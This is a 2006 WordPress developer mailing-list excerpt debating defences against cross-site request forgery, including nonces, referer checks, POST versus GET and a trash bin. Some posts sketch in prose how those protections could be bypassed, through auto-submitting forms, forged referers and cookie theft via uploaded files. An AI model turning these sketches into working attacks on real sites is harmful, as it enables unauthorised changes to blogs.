I don't understand why the query in the while loop which check for _pingme rows doesn't check if the post is really ready to be pingbacked or trackbacked (at least post_date < current time).

Also I am trying to understand the real reason behind calling this code via a socket connection (instead of including it). is it merely in the hope that due to the small timeout sometimes it will fail thereby achieving the asynchronicity on pinback and trackback?

Can anyone please clarify.

Best,
Angsuman
http://blog.taragana.com/

From ringmaster at midnightcircus.com  Mon Apr 24 18:55:35 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr 24 18:55:46 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>
	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
Message-ID: <444D1F27.4030607@midnightcircus.com>

David House wrote:
> And thus, anyone that says switching to POST is a magic bullet needs
> to rethink their views. Switching is _not_ a less complex solution, as
> it would have to be introduced on top of nonces anyway.

Thank you for helping me say this more succinctly.

> However, I am a standards-are-good kind of guy and I would like to see
> a solution where we use POST wherever possible, with GET only as a
> fallback. Andrew K showed us that the UI hit is somewhat negligible
> (although a proper cross-browser solution is a prerequisite), so you
> have my +1 here. Basically, I don't see any advantage or disadvantage
> of either POST or GET.

If someone can offer a patch that switches actions to POST I would be 
happy to see it, provided:

1) It doesn't affect the ability to moderate comments via GET links in 
email notifications.
2) It maintains internally consistent UI throughout WordPress.

The sample page Andrew provided is not bad, but there are still some 
issues with consistency in Safari.  I don't know that there is a 
workaround.  The ones suggested previously didn't work for me; maybe I 
missed one.

Owen


From angsuman at taragana.com  Mon Apr 24 19:08:55 2006
From: angsuman at taragana.com (Angsuman Chakraborty)
Date: Mon Apr 24 19:13:41 2006
Subject: [wp-hackers] RE: A quick update on the security issue
	I'dmentionedtoday
In-Reply-To: <512061b90604241105needb05bqc639f6569c13e5c8@mail.gmail.com>
Message-ID: <MJEEIIFCKOJBBNFPJGJCOEOGLDAA.angsuman@taragana.com>

> it.  But I'd rather keep it out of Google as much as possible... 

Does security by obscurity ever work?
-----Original Message-----
From: wp-hackers-bounces@lists.automattic.com
[mailto:wp-hackers-bounces@lists.automattic.com]On Behalf Of Abhay Kumar
Sent: Monday, April 24, 2006 11:35 PM
To: wp-hackers@lists.automattic.com
Subject: Re: [wp-hackers] RE: A quick update on the security issue
I'dmentionedtoday
Importance: Low


> The damage is mostly already done, I'm sure.  Someone will be blogging about
> it.  But I'd rather keep it out of Google as much as possible...  I did not
> want to create a one stop shop for attacking sites.  That won't help anyone
> other than those that don't need to be helped.
Unfortunuately, the mailing list archives are indexed by google.

> All of this information is out there in bits and pieces.  I just put it
> together in one place.
True.

--
Abhay Kumar
http://abhaykumar.net/
_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From elharo at metalab.unc.edu  Mon Apr 24 19:10:27 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 19:14:59 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <a491f91d0604240813q586f7cb9u28213e269d1cf187@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<444CC938.7040908@metalab.unc.edu>
	<444CCBDE.5050705@atl.lmco.com>	<444CD748.30306@metalab.unc.edu>
	<444CDE1E.1020202@atl.lmco.com>	<444CE7F9.3000300@metalab.unc.edu>
	<a491f91d0604240813q586f7cb9u28213e269d1cf187@mail.gmail.com>
Message-ID: <444D22A3.1000002@metalab.unc.edu>

Robert Deaton wrote:

> If there's a more robust solution, we're still waiting to hear it. All
> we've heard is some pedantry about the HTTP standard. Matt has
> dismissed the idea because, as he sees it (and I must agree), a
> solution using POST still needs nonces, and has detrimental
> side-effects (can't approve comments from e-mails et al). 

You continue to ask for things that can't and shouldn't be done. Not 
approving comments from e-mails via GET is a feature, not a bug. As long 
as you insist on bug-prone kludges like this, it's pointless for me to 
submit a patch. You've already said you aren't willing to accept a 
version of WordPress that limits GET to safe operations as I require. 
When you change your mind about that, then it's worth my time to submit 
a patch.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From denis at semiologic.com  Mon Apr 24 19:14:37 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Mon Apr 24 19:18:55 2006
Subject: [wp-hackers] RE: A quick update on the security
	issueI'dmentionedtoday
In-Reply-To: <MJEEIIFCKOJBBNFPJGJCOEOGLDAA.angsuman@taragana.com>
Message-ID: <000301c667d3$55fc5b40$2f01a8c0@kergan>



> > it.  But I'd rather keep it out of Google as much as possible...
> 
> Does security by obscurity ever work?

Posting detailed howtos on billboards certainly doesn't. :)

D.

From elharo at metalab.unc.edu  Mon Apr 24 19:18:10 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 19:22:47 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CF914.7000805@ryanduff.net>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<444CC938.7040908@metalab.unc.edu>	<444CCBDE.5050705@atl.lmco.com>	<444CD748.30306@metalab.unc.edu>	<444CDE1E.1020202@atl.lmco.com>	<444CE7F9.3000300@metalab.unc.edu>	<444CEC6C.5050000@atl.lmco.com>	<444CEF6E.2080409@metalab.unc.edu>
	<444CF914.7000805@ryanduff.net>
Message-ID: <444D2472.4080506@metalab.unc.edu>

Ryan Duff wrote:

> Is it just me or does it seem like every 6 months someone comes in and 
> makes a big deal about nothing, then when the dev team decides against 
> them, they threaten to fork?
> 
> Forking is not a threat!

You're right. It's not a threat. People need to stop seeing it as one.

Forking is a right granted by the GPL, though some people here seem to 
feel it's wrong and shouldn't be taken advantage of.

> If you don't like the direction something is going, the devs don't want 
> your work, Fork. Fork and shut up about it. This has to be the longest 
> going thread ever. Only because you keep coming back and replying with 
> the same thing to everyone's message.

Only because people keep telling me I'm supposed to submit patches back 
in the same message they tell me they don't want them. Also because 
there's a lot of misinformation flying around here, and it's worth 
clearing some of that up.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From Brian at TheCodeCave.com  Mon Apr 24 19:20:04 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 19:24:19 2006
Subject: [wp-hackers] RE: A quick update on the
	securityissueI'dmentionedtoday
In-Reply-To: <000301c667d3$55fc5b40$2f01a8c0@kergan>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98094@dsimail.drbsystems.com>

Denis de Bernardy:
>Posting detailed howtos on billboards certainly doesn't. :)
Agreed!

*smack*

From Brian at TheCodeCave.com  Mon Apr 24 19:22:36 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 19:26:54 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444D1771.9090805@concept64.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98095@dsimail.drbsystems.com>

David House wrote:
> You log into your blog one...you don't hit the "Log Out" 
> then you're browsing your way through the World Wide Web, and 
> you come across this: http://asymptomatic.net/temp/hack.htm
> You click it, and OOPS! It's too late. There goes one of your posts.
> Therefore, we either need nonces or a referer check. 
Obviously what David gave is just an example but I figured I'd add onto it a
little.  

If you just came across a link while browsing, that link would have to know
who you are in order to try to attack your blog specifically.  
That's not as far fetched as it may sound.  Let's say for instance you were
in a heated debate on some email list and got someone angry at you.
Then they use this attack targeted deliberately at you knowing you ran an
older version of WP.  

The older version is required for. as David implies, Wordpress blocks this
kind of attack now through the referrer check.  

This is just one way that WP 2.0 is so much safer than say 1.2.

> Referer checks are a pain to those firewalled, and are easy to miss, so
I'd vote for
> nonces.
Additionally, they are easy to miss AND they are easily forged.  This can be
done in custom browsers or by webservers themselves.


> And thus, anyone that says switching to POST is a magic bullet needs
> to rethink their views. 
What David does not say in so many words is that hack.htm can include a form
that is submitted via a POST.
It can be done without a button or even as a page is displayed without any
interaction from the user.

Right now it is a combination of things that makes WP safe.  To perform most
admin actions, you need up to things.
1. An admin with an active cookie.
2. To have just come from a WP Admin page. (referer check)
3. For some actions, like adding a user, a post.

I'd already discussed a way to get past 1 & 2 at the same time.  And someone
posted an example of doing it.  Another example I (accidentally) listed
earlier showed how to get past 2 & 3 at the same time.  However, getting
past both 2 & 3 is worthless if you don't have #1 - an admin cookie.
Getting a cookie from another site is not impossible, but WordPress blocks
most attacks that can do it.  However, any php or htm on a site, has access
to your cookie for that site.  So, if you allow people to put a file on your
site, you've just given away the last restriction.

Nonces, then add a #4 to the list (or perhaps replaces #2)
Then the attacker has to figure out a way to retrieve the nonce prior to the
attack.  Putting it in the cookie, means that you are back down to only
having to get the cookie before you have everything.  So, the present
proposal builds it into the form, if memory serves.  So, I think that's
pretty much where we are at in the conversation.

BTW some could say that there already is a #4
4. Prompting Yes or No

However, that yes or no submit the "Yes" command somewhere, somehow too.
So, unless it uses nonces too, that one is really a non-starter.  




From elharo at metalab.unc.edu  Mon Apr 24 19:30:00 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 19:34:33 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98095@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98095@dsimail.drbsystems.com>
Message-ID: <444D2738.4060407@metalab.unc.edu>

Brian Layman wrote:

> BTW some could say that there already is a #4
> 4. Prompting Yes or No
> 

There's also an option 5 that's been proposed, allowing Undo rather than 
immediately deleting everything from the database. That's worth 
considering on user interface grounds alone, irrespective of security.

None of these options seem mutually exclusive. Defense in depth is a 
good thing.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From Brian at TheCodeCave.com  Mon Apr 24 19:48:35 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 19:52:49 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444D2738.4060407@metalab.unc.edu>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98096@dsimail.drbsystems.com>

Elliotte Rusty Harold countered with:
> There's also an option 5 that's been proposed, allowing Undo rather than 

Yes.  That forces an attack to be multiple steps.  Any delete attack must
involves emptying the bin too for the damage to be permanent.

Because the current nonce design is action specific, it offers protection
against that.  You can't delete and flush/empty at the same time.

> Defense in depth is a good thing.
Agreed.

From m at mullenweg.com  Mon Apr 24 20:01:32 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Apr 24 20:07:55 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CD748.30306@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<444CC938.7040908@metalab.unc.edu>	<444CCBDE.5050705@atl.lmco.com>
	<444CD748.30306@metalab.unc.edu>
Message-ID: <444D2E9C.206@mullenweg.com>

Elliotte Harold wrote:
> Forking is a core principle of open source development. One of the 
> reasons we write open source (better yet, free) software is precisely so 
> that developers who have different needs or who have different visions 
> can explore different options.

Normally I would encourage folks to work together, as I think forking 
often has practical disadvantages for a community, but I think your 
posts here have clearly demonstrated that your time might be better 
spent playing in your own sandbox. I'll follow your fork and hopefully 
the brilliance of your code will stun us into seeing the wisdom of your 
ways. Good luck and Godspeed.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From davebytes at comcast.net  Mon Apr 24 20:10:08 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Apr 24 20:13:34 2006
Subject: [wp-hackers] Security at Wordpress
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com><444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com><444CF6A6.9010002@midnightcircus.com><ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
	<444D1F27.4030607@midnightcircus.com>
Message-ID: <01aa01c667db$15da13b0$6e01a8c0@sixfour>

Is it allowed to require a AYS (i.e. POST-ed form) to validate the approval? 
Otherwise, I gotta agree with folks, we seem to be specifically leaving open 
a 'GET hole', which breaks the whole "switch to POSTs everywhere they should 
be".

I'd personally prefer the moderate-by-email thing take me to the 
comments-for-that-post page, and let me then moderate from there.  I find I 
don't necessarily want to just approve/delete, I want to see the context of 
comments.  And then that page would (of course) be moving to POST-ed 
actions...

-d

----- Original Message ----- 
Owen Winkler wrote
| If someone can offer a patch that switches actions to POST I would be
| happy to see it, provided:
|
| 1) It doesn't affect the ability to moderate comments via GET links in
| email notifications.

From davebytes at comcast.net  Mon Apr 24 20:12:43 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Apr 24 20:16:10 2006
Subject: [wp-hackers] Questions on execute-pings.php...
References: <MJEEIIFCKOJBBNFPJGJCKENPLDAA.angsuman@taragana.com>
Message-ID: <01b601c667db$7227af60$6e01a8c0@sixfour>

Someone correct me if I'm wrong... the 'include' would work within the 
current thread, thus affecting the user response if something takes a while. 
using a socket effectively spawns it off on another thread, another context, 
without affecting the current session.

At least, that's what I seem to recall... ;)

-d

----- Original Message ----- 
From: "Angsuman Chakraborty" <angsuman@taragana.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, April 24, 2006 2:36 PM
Subject: [wp-hackers] Questions on execute-pings.php...


Hi,

I don't understand why the query in the while loop which check for _pingme 
rows doesn't check if the post is really ready to be pingbacked or 
trackbacked (at least post_date < current time).

Also I am trying to understand the real reason behind calling this code via 
a socket connection (instead of including it). is it merely in the hope that 
due to the small timeout sometimes it will fail thereby achieving the 
asynchronicity on pinback and trackback?

Can anyone please clarify.

Best,
Angsuman
http://blog.taragana.com/

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From Brian at TheCodeCave.com  Mon Apr 24 20:18:34 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 20:22:52 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <01aa01c667db$15da13b0$6e01a8c0@sixfour>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98097@dsimail.drbsystems.com>

David Chait
>Is it allowed to require a AYS (i.e. POST-ed form) to validate the
approval? 
You're mixing apples and oranges.   AYS does not mean "post" and posts
doesn't fix everything.

Owen's submitted a good fix for all of this that includes AYS prompts but
not switching over to posting.  

The discussion at this point is largely academic.  

Switching over to posting would mean rewriting a lot more code and require a
lot more testing and would delay any release.

That's good enough reason not to do it right now, IMHO.

_______________________________________________
Brian Layman
www.TheCodeCave.com
 

From robmientjes at gmail.com  Mon Apr 24 20:27:08 2006
From: robmientjes at gmail.com (Rob Mientjes)
Date: Mon Apr 24 20:31:17 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com> <444CF6A6.9010002@midnightcircus.com>
	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
Message-ID: <e8e97f9f0604241327g7f610e77v98dc39e30de0f5b0@mail.gmail.com>

On 24/04/06, David House <dmhouse@gmail.com> wrote:
> And thus, anyone that says switching to POST is a magic bullet needs
> to rethink their views. Switching is _not_ a less complex solution, as
> it would have to be introduced on top of nonces anyway.
>
> However, I am a standards-are-good kind of guy and I would like to see
> a solution where we use POST wherever possible, with GET only as a
> fallback. Andrew K showed us that the UI hit is somewhat negligible
> (although a proper cross-browser solution is a prerequisite), so you
> have my +1 here. Basically, I don't see any advantage or disadvantage
> of either POST or GET.

I don't pretend to be a programmer or an expert on this topic. I was
merely expressing my user experiences, which I believed it was still
about in the WordPress development?

Not attacking you, just makin' sure. The users can have a voice too!

-Rob.
From m at mullenweg.com  Mon Apr 24 20:28:04 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Apr 24 20:34:17 2006
Subject: [wp-hackers] RE: A quick update on the security issue I'd
	mentioned today
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98090@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98090@dsimail.drbsystems.com>
Message-ID: <444D34D4.1070202@mullenweg.com>

Brian Layman wrote:
> Frankly, I'm glad I was misled on ease of cookie stealing through CSRF.  It
> is that easy through XSS, but XSS is easy to protect against too.  If CSRF
> could get cookies as it first appeared, just about anything would have been
> vulnerable.  I'd rather appear an alarmist (as I unfortunatley do right now
> - sorry) than to have that big of a hole there.  The current situation is
> not ideal, but it sure limits the vulnerable systems.   That was another
> reason why I kept the details off of the public list.  Creating a panic,
> even if this hole was as big as I initially thought it was, would have
> served no purpose.

If the attacker is able to upload and execute a file on the server, it's 
already far beyond where we could do anything on the WordPress level to 
protect that site. What you describe is a pretty clever hack once things 
are already on the server, though. Thanks for continuing to investigate 
this.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From mike at zed1.com  Mon Apr 24 20:30:10 2006
From: mike at zed1.com (Mike Little)
Date: Mon Apr 24 20:34:21 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com> <444CF6A6.9010002@midnightcircus.com>
	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
Message-ID: <7235ce780604241330u87c79cfs98cf45d86848777f@mail.gmail.com>

On 4/24/06, David House <dmhouse@gmail.com> wrote:
> On 24/04/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> > Using POST does not obviate nonces or referer checks.
>
> Lets just re-iterate that, folks.
>
> > Using POST does not obviate nonces or referer checks.
>
> One more time with feeling.
>
> > Using POST does not obviate nonces or referer checks.
>
> A little aside for anyone who doesn't understand the attack vector:

The example exploit, that works NOW, *with* referrer check,
demonstrated by Brian, *would not* work if delete was a POST.  That is
why some people got so heated about POST vs GET. It is demonstrably
safer, right now.
Not completely safe*, true, but safe from the existing exploit!

Allegedly, POST plus referrer check can still be circumvented, though
I do not understand how. Yes, you can fool an admin into clicking on a
link which will take him to a page with an evil form, but even if you
get *that* page to auto submit, the form's referrer would be itself,
not an admin page.

Unlike the GET attack which can be in your admin comments page, there
is no way to get an evil form in an Admin page, apart from authorised
users who can do any number of evil things.


Mike
--
Mike Little
http://zed1.com/
From robmientjes at gmail.com  Mon Apr 24 20:31:13 2006
From: robmientjes at gmail.com (Rob Mientjes)
Date: Mon Apr 24 20:35:23 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <015501c667c2$b569bd40$6e01a8c0@sixfour>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com> <444CF6A6.9010002@midnightcircus.com>
	<015501c667c2$b569bd40$6e01a8c0@sixfour>
Message-ID: <e8e97f9f0604241331q3cb88de4rf60baeb0844df1c8@mail.gmail.com>

On 24/04/06, David Chait <davebytes@comcast.net> wrote:
> Trash can, recycle bin, whatever should alleviate ANY potential issues with
> mass-deletion of posts, comments, etc.  And would improve usability for the
> average user (imho).  Not to mention once in a blue moon it'd be real
> helpful for the techies who accidentally delete a comment they didn't mean
> to (who, me?).

Again a user side experience: the trash bin analogy is more than just
common. The extra layer is one we should consider well, but I would
opt for it. Many people?including me, whoops!?make mistakes, and a
trash bin is exactly the saviour in those cases.

If this is one layer too much or whatever, I'm willing to accept that,
but every sensible option should be considered. I think that's also a
part of the WP development? I think it should be, anyway.

-Rob.
From podz at tamba2.org.uk  Mon Apr 24 20:37:24 2006
From: podz at tamba2.org.uk (Podz)
Date: Mon Apr 24 20:41:51 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e8e97f9f0604241331q3cb88de4rf60baeb0844df1c8@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>	<015501c667c2$b569bd40$6e01a8c0@sixfour>
	<e8e97f9f0604241331q3cb88de4rf60baeb0844df1c8@mail.gmail.com>
Message-ID: <444D3704.6010402@tamba2.org.uk>

Rob Mientjes wrote:
> On 24/04/06, David Chait <davebytes@comcast.net> wrote:
>> Trash can, recycle bin, whatever should alleviate ANY potential issues with
>> mass-deletion of posts, comments, etc.  And would improve usability for the
>> average user (imho).  Not to mention once in a blue moon it'd be real
>> helpful for the techies who accidentally delete a comment they didn't mean
>> to (who, me?).
> 
> Again a user side experience: the trash bin analogy is more than just
> common. The extra layer is one we should consider well, but I would
> opt for it. Many people?including me, whoops!?make mistakes, and a
> trash bin is exactly the saviour in those cases.
> 
> If this is one layer too much or whatever, I'm willing to accept that,
> but every sensible option should be considered. I think that's also a
> part of the WP development? I think it should be, anyway.

http://comox.textdrive.com/pipermail/wp-hackers/2006-February/004816.html

Did that before :)

P.
From robmientjes at gmail.com  Mon Apr 24 20:39:23 2006
From: robmientjes at gmail.com (Rob Mientjes)
Date: Mon Apr 24 20:43:32 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444D3704.6010402@tamba2.org.uk>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com> <444CF6A6.9010002@midnightcircus.com>
	<015501c667c2$b569bd40$6e01a8c0@sixfour>
	<e8e97f9f0604241331q3cb88de4rf60baeb0844df1c8@mail.gmail.com>
	<444D3704.6010402@tamba2.org.uk>
Message-ID: <e8e97f9f0604241339r95f20c4y6aa611ce8b3eac2a@mail.gmail.com>

On 24/04/06, Podz <podz@tamba2.org.uk> wrote:
> http://comox.textdrive.com/pipermail/wp-hackers/2006-February/004816.html
>
> Did that before :)

:) Sorry, that'll teach me not to keep up with everything.

-Rob.
From mikea at turbonet.com  Mon Apr 24 20:44:18 2006
From: mikea at turbonet.com (Michael D Adams)
Date: Mon Apr 24 20:47:13 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444B8205.8070200@concept64.com>
References: <444B8205.8070200@concept64.com>
Message-ID: <1E9B621A-B9A4-4999-B332-ECAC4924E26C@turbonet.com>

On Apr 23, 2006, at 6:32 AM, Ryan Scheuermann wrote:
> No offense to whomever wrote all this wonderful AJAX and list  
> management code, but I fear the maintainability and extensibility  
> of all this is going to become a problem in future releases.
None taken.  I'm not sure about your maintainability concern, though.

> Personally, I recommend Prototype.  http://prototype.conio.net/
Prototype is very nice.  It wasn't quite up to snuff when the first  
grain of ajax went into WP, and sack was lean, easy as heck to use  
and written by a "member of the WP community" (however one defines  
that).  Boom.  Instant category addition.

As the listMan stuff developed,  sack's limitations started cropping  
up.  That's why list-manipulation-js.php defines the WPAjax "class".   
It's a half-baked attempt to do some generic error passing and  
response validation, and it's a convenient place to keep any bits  
needed for consistency.

listMan is not brilliant code.  It's pretty ugly in places,  
actually.  But it gets the job done.  All of the JS files that use it  
are < 30 lines of code (most are ~5) and could be made even better  
with a tweak or two here and there.  Also (other than the recoloring  
of alternating rows) it all seems pretty fast (I don't have anything  
even close to a set of benchmarks).

If we decide to use prototype, I'd be all for that; it's popular,  
well maintained and it works.  Someone else can do the listMan  
rewrite (or replacement), though.  It should have another set of eyes  
look at it anyway.

Michael
--mdawaffe
From ryan at concept64.com  Mon Apr 24 20:44:07 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 20:48:19 2006
Subject: [wp-hackers] WP Trashbin
In-Reply-To: <444D3704.6010402@tamba2.org.uk>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com>	<444CF6A6.9010002@midnightcircus.com>	<015501c667c2$b569bd40$6e01a8c0@sixfour>	<e8e97f9f0604241331q3cb88de4rf60baeb0844df1c8@mail.gmail.com>
	<444D3704.6010402@tamba2.org.uk>
Message-ID: <444D3897.6050409@concept64.com>

Podz wrote:
> Rob Mientjes wrote:
>> On 24/04/06, David Chait <davebytes@comcast.net> wrote:
>>> Trash can, recycle bin, whatever should alleviate ANY potential 
>>> issues with
>>> mass-deletion of posts, comments, etc.  And would improve usability 
>>> for the
>>> average user (imho).  Not to mention once in a blue moon it'd be real
>>> helpful for the techies who accidentally delete a comment they 
>>> didn't mean
>>> to (who, me?).
>>
>> Again a user side experience: the trash bin analogy is more than just
>> common. The extra layer is one we should consider well, but I would
>> opt for it. Many people?including me, whoops!?make mistakes, and a
>> trash bin is exactly the saviour in those cases.
>>
>> If this is one layer too much or whatever, I'm willing to accept that,
